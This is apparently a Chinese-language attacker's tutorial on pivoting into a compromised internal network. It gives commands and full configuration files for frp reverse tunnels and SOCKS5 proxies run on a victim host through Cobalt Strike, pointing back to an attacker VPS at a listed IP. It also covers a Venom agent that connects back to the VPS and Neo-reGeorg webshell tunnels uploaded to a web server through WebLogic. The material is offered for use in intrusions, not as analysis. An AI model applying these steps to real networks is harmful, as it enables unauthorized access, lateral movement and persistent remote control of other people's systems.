内网端口转发和socks连接

端口转发

在自己的vps上运行fprs，服务器是Linux

./frps -c frps.ini

上传一个frp-window到被攻击的内网主机，这台主机因为是内网机器我们不能直接访问，通过打下对方的服务器进行横向移动拿到对方的一台内网主机（cs上线）再在对方的主机上传一个frpc.exe和frpc.ini，配置文件内容如下，再在cs运行frpc.exe即可完成内网端口的转发

shell cmd.exe /c frpc.exe -c frpc.ini

建立内网socks连接

在往对面的内网主机上传frpc.exe后再上传一个socks代理的配置文件，文件如下，再建立连接

shell cmd.exe /c frpc.exe -c frp_proxy.ini

再访问我的vps加指定的远程端口即可连接上对方的内网主机

**这个时候我已经成为了对方内网的一台虚拟注意，我可以任意访问内网的其他主机

下载服务端的frps-Linux和客户端的frpc-windows

服务的的配置文件frps.ini

[common]
bind_addr = 0.0.0.0
bind_port = 7000
# auth token
token = 48484

内网端口转发配置客户端fpr-windows文件frpc.ini

[common]
server_addr = 127.0.0.1
server_port = 7000
token = 48484

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 80
remote_port = 6000

与内网建立socks连接配置文件，新建一个文件frp_proxy.ini

[common]
server_addr = 137.220.34.205
server_port = 7000
token = 48484
[socks5]
type = tcp
remote_port = 6000
plugin = socks5
# 设置账号密码
# plugin_http_user = abc
# plugin_http_passwd = abc

# plugin = socks5
# plugin_user = abc
# plugin_passwd = abc

venom

往vps上传admin_linux_x64

监听端口

./admin_linux_x64 -lport 5555

对面机器上传一个agent.exe，执行

agent.exe -rhost vps-ip -rport 5555

开启一个socks端口即可访问内网机器

socks 7777

webshell-http代理-Neo-reGeorg 

1、设置密码生成 tunnel.(aspx|ashx|jsp|jspx|php) 并上传到WEB服务器

$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel_compatibility.jspx
       => neoreg_servers/tunnel.php
       => neoreg_servers/tunnel.ashx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel_compatibility.js

2、将jsp文件复制通过weblogic上传到网站跟目录

3、 使用 neoreg.py 连接 WEB 服务器，在本地建立 socks5 代理，默认代理端口1080，可加-p指定端口。-l让其他机器也可以使用这个代理

$ python3 neoreg.py -k 123456 -u http://xx/indexx.jsp -l 0.0.0.0 --skip
+------------------------------------------------------------------------+
  Log Level set to [DEBUG]
  Starting socks server [127.0.0.1:1080]
  Tunnel at:
    http://xx/indexx.jsp
+------------------------------------------------------------------------+

如果打上了一台内网的机器，可以负载均衡，把流量分给内网的一台机器-r < redirect_url>
